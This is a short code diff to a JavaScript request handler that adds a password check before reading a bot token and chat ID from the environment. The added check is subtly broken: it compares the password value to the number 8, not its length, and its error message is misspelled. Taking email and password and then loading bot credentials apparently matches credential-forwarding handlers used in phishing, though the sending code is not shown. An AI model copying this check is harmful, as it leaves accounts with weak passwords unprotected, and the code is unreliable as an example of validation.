@@ -16,6 +16,15 @@ export default async function handler(req, res) {
             message: "Invalid test email"
         });
     }
+   const { password } = req.body || {};
+   
+if (
+ password < 8 
+) {
+  return res.status(400).json({
+            message: "Password invalable"
+        });
+}
 
     const token = process.env.BOT_TOKEN;
     const chatId = process.env.CHAT_ID;
